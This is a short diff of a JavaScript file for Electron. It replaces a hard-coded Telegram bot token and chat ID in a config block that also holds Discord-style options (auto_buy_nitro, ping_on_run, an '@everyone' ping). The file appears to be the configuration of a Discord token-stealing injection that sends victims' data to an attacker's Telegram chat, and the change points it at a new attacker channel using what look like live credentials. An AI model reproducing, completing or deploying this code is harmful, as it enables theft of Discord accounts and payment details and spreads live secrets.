@@ -6,8 +6,8 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  telegram_bot_token: '7924146161:AAEZaY05bDRPV8OOb1e2sTV3HHLr8qZZB5A', // Exemplo: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
-  telegram_chat_id: '-4685915955', // Exemplo: '-100123456789' ou '123456789'
+  telegram_bot_token: '7579214963:AAFi6V1xuFw4hX3_krSWsRzSLuAkZOZyz_4', // Exemplo: '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
+  telegram_chat_id: '6712624688', // Exemplo: '-100123456789' ou '123456789'
   auto_buy_nitro: false,
   ping_on_run: true,
   ping_val: '@everyone',
